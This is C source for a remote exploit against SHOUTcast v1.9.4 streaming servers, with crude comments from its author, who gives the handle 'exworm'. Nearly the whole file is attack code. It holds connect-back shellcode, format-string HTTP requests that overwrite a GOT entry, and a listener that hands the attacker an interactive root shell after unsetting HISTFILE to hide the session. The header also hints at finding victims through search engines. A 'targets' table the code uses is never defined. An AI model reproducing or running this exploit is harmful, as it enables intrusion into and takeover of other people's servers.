/*           _ ________            _____                        ______
 *
 * exwormshoucast  part of PTjob project  SHOUTcast v1.9.4 remote exploit   / \  / "fuck mm"
 * by jsk exworm (exworm.hostrocket.com)             \/
 * my home www.ph4nt0m.org
 * bug found by pucik_at_cc-team.org
 * test it in redhat 9.0 an fedora 1( use google :8000/listen.ls  maybe get some ..hehe)
 * laji  chengxu  ....so pub it...
 * GT: emm.oyxin.seal.ava.haggis.b_root.more..
 * No girl No money  No jop...
 *[root@localhost home]# ./suck_shoutcast -h ***.***.***.***
 *SHOUTcast v1.9.4 remote exploit by exworm of 0seen
 *--------------------------------------------------(need money.to..fk..girl..)
 *[+] lisntener...
 *[*] Sending first request ...
 *[*] Sending second request ...
 *[+] ownedbyOseen!
 *-----------------------------------------------------------
 *Linux localhost.localdomain 2.4.22-1.2115.nptl #1 Wed Oct 29 15:42:51 EST 2003 i686 i686 i386 GNU/Linux
 *uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 *** oseen are chinese...
 *
 *
 *
 */

#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <netdb.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <getopt.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <errno.h>
#include <linux/sockios.h>

#define BUF 1024



char linux_connect_back[] =  /* connect back 45295 */
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x90\x90\x90\x90\x90\x90\x90\x90"
        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
        "\x89\xc2\x31\xc0\x31\xc9\x51\x51"
        "\x68\xc0\xa8\x5a\x01\x66\x68\xb0"
        "\xef\xb1\x02\x66\x51\x89\xe7\xb3"
        "\x10\x53\x57\x52\x89\xe1\xb3\x03"
        "\xb0\x66\xcd\x80\x31\xc9\x39\xc1"
        "\x74\x06\x31\xc0\xb0\x01\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xcd\x80"
        "\x31\xc0\xb0\x3f\x89\xd3\xb1\x01"
        "\xcd\x80\x31\xc0\xb0\x3f\x89\xd3"
        "\xb1\x02\xcd\x80\x31\xc0\x31\xd2"
        "\x50\x68\x6e\x2f\x73\x68\x68\x2f"
        "\x2f\x62\x69\x89\xe3\x50\x53\x89"
        "\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0"
        "\x01\xcd\x80";
int sock;
void usage();
void shell();

void
usage(char *prog)
{

         fprintf(stderr,"Usage: %s -t [-pah]\n",prog);
        fprintf(stderr,"-t version       Linux version.\n");
        fprintf(stderr,"-h target       The host to attack.\n");
         fprintf(stderr,"-a devices     Default device is \"ppp0\".\n");
        fprintf(stderr,"-p port         Default port is 8000.\n\n");
}

int
openhost(char *host,int port)
{
        struct sockaddr_in addr;
        struct hostent *he;

        he=gethostbyname(host);

        if (he==NULL) return -1;
        sock=socket(AF_INET, SOCK_STREAM, getprotobyname("tcp")->p_proto);
        if (sock==-1) return -1;

        memcpy(&addr.sin_addr, he->h_addr, he->h_length);

        addr.sin_family=AF_INET;
        addr.sin_port=htons(port);

        if(connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == -1)
        sock=-1;
        return sock;
}


void
shell(int sock)
{
        fd_set  fd_read;
        char buff[1024], *cmd="unset HISTFILE; /bin/uname -a;/usr/bin/id; echo '*** oseen are chinese...'\n";
        int n;

        FD_ZERO(&fd_read);
        FD_SET(sock, &fd_read);
        FD_SET(0, &fd_read);

        send(sock, cmd, strlen(cmd), 0);

        while(1) {
                FD_SET(sock, &fd_read);
                FD_SET(0,    &fd_read);

                if (select(sock+1, &fd_read, NULL, NULL, NULL) < 0) break;

                if (FD_ISSET(sock, &fd_read)) {
                        if ((n = recv(sock, buff, sizeof(buff), 0)) < 0){
                                fprintf(stderr, "[+] EOF\n");
                                exit(2);
                        }

                        if (write(1, buff, n) <0) break;
                }

                if (FD_ISSET(0, &fd_read)) {
                        if ((n = read(0, buff, sizeof(buff))) < 0){
                                fprintf(stderr,"[+] EOF\n");
                                exit(2);
                        }

                        if (send(sock, buff, n, 0) < 0) break;
                }
        }

        fprintf(stderr,"[+] Connection lost.\n\n");
        exit(0);
}

unsigned char
*get_my_ip_addr(int sockfd, struct ifreq *ifr)
{
        struct sockaddr_in sin;
        char *b = (char *) malloc(4);

        if (ioctl(sockfd ,SIOCGIFADDR,ifr) < 0) {
                fprintf(stderr, "Unable to get the local IP Address, use -a.\n");
                exit(1);
        }

        memcpy(&sin, &ifr->ifr_addr, sizeof(struct sockaddr_in));
        memcpy(b, (char *) &sin.sin_addr.s_addr, 4);
        return b;
}


int
main (int argc,char *argv[])
{
        char buf1[512];
        char buf2[512];
        char host[256];
        char pass[256]="changeme";
        char data;








        int  type= 0;
        int c=0;
        int port=8001;
        char devices[256] = "ppp0";
        unsigned char *ptr;

        struct hostent *hp;
        struct sockaddr_in sin_listener;
        struct ifreq ifr;
        struct timeval timeout;

        fd_set fdread;

        int delay       = 12;
        int i           = 0;
        int mode        = 0;
        int local_port  = 0;
        int opt         = 0;
        int ret         = 0;
        int sin_len     = sizeof (struct sockaddr_in);
        int sock        = 0;
        int sock2       = 0;
        int sockd       = 0;
        int listener    = 0;
        int time_out    = 4;
        int tmp         = 0;

        srand(getpid());

        fprintf(stdout,"SHOUTcast v1.9.4 remote exploit by exworm of 0seen\n");
        fprintf(stdout,"--------------------------------------------------(www.oseen.org)\n");

        while((c=getopt(argc,argv,"h:p:a:t:")) !=EOF)
        {
                switch(c)
                {
                        case 'p':
                                port=atoi(optarg);
                                if ((port <= 0) || (port > 65535)) {
                                        fprintf(stderr,"Invalid port.\n\n");
                                        exit(1);
                                }
                                break;
                        case 'a':
                                memset(devices,0x0,sizeof(devices));
                                strncpy(devices,optarg,sizeof(devices) - 1);
                                break;
                        case 't':
                                type = atoi(optarg);
                                if (type == 0 || type > sizeof(targets) / 28) {
                                        for(i = 0; i < sizeof(targets) / 28; i++)
                                        fprintf(stderr, "%02d. %s - %s      [0x%08x - 0x%08x]\n",
                                                i + 1, targets[i].distro, targets[i].type, targets[i].ret, targets[i].eax);
                                        return -1;
                                }
                                break;
                        case 'h':
                                memset(host,0x0,sizeof(host));
                                strncpy(host,optarg,sizeof(host) - 1);
                                break;

                        default:
                                usage(argv[0]);
                                exit(1);
                                break;
                }
        }

        timeout.tv_sec = time_out;
        timeout.tv_usec = 0;





        if (strlen(host) == 0) {
                usage(argv[0]);
                exit(1);
        }
        sock=openhost(host, port);

        if (sock==-1) {
                fprintf(stderr,"- Unable to connect.\n\n");
                exit(1);
        }

        strncpy(ifr.ifr_name, devices, 15);

        if ((sockd = socket(AF_INET, SOCK_DGRAM, 17)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }

        if ((listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
                fprintf(stderr, "socket() error.\n");
                return -1;
        }

        ptr = get_my_ip_addr(sockd, &ifr);
       memcpy(&sin_listener.sin_addr.s_addr, ptr, 4);

        sin_listener.sin_family = AF_INET;
        memset(&sin_listener.sin_zero, 0x00, 8);

        while(1) {
                local_port = local_port = 45295;
                sin_listener.sin_port = htons(local_port);
                if (!bind(listener, (struct sockaddr *) &sin_listener, sin_len)) break;
        }



        listen(listener, 1);
        fprintf(stdout, "[+] lisntener...\n");

        linux_connect_back[129] = (unsigned int) *(ptr + 0);
        linux_connect_back[130] = (unsigned int) *(ptr + 1);
        linux_connect_back[131] = (unsigned int) *(ptr + 2);
        linux_connect_back[132] = (unsigned int) *(ptr + 3);



      char req[1024] = "GET /content/DD"
"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"

"DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD";

     strcat(req, "DD.mp3 HTTP/1.0\r\n\r\n");

      char req1[1024] = "GET /content/AA"
      /* sprintf GOT addr */
      "\x3c\x49\x06\x08\x3d\x49\x06\x08\x3e\x49\x06\x08\x3f\x49\x06\x08";





      strcat(req1, linux_connect_back);
      strcat(req1, ".mp3 HTTP/1.0\r\n\r\n");

      char *req2 = "GET /content/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n-AAAAAAAAAAAAAAAAAAAAAAAAAA"
      "AAAAAAAAAAAAAAA-%n-"
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-%n.mp3"
      " /HTTP/1.0\r\n\r\n";


      printf("[*] Sending first request ...\n");
      write(sock, req1, strlen(req1));

      close(sock);
      sock=openhost(host, 8000);
              if (sock==-1) {
                fprintf(stderr,"- Unable to connect.\n\n");
                exit(1);
        }

      printf("[*] Sending second request ...\n");


        while(1) {
                write(sock, req2, strlen(req2));
                sleep(2);
                FD_ZERO(&fdread);
                FD_SET(listener, &fdread);

                timeout.tv_sec = time_out;
                timeout.tv_usec = 0;

                while(1) {

                        ret = select(FD_SETSIZE, &fdread, NULL, NULL, &timeout);

                        if (ret < 0) {
                                close(sock);
                                close(listener);
                                fprintf(stderr, "select() error.\n");
                                return -1;
                        }

                        if (ret == 0) {
                                fprintf(stderr, "[+] Failed, waiting %d seconds.\n"
                                                "[+] Use ctrl-c to abort.\n", delay);
                                sleep(delay);
                                break;
                        }

                        if(FD_ISSET(listener, &fdread)) {
                                sock2 = accept(listener, (struct sockaddr *)&sin_listener, &sin_len);
                                close(sock);
                                close(listener);

                                fprintf(stderr, "[+] ownedbyOseen!\n"
                                                "-----------------------------------------------------------\n");
                                shell(sock2);
                                close(sock2);
                                return 0;
                        }
                }

        }

        fprintf(stderr, "[+] Exploit failed.\n");
        close(listener);
        close(sock);
        return 0;

}

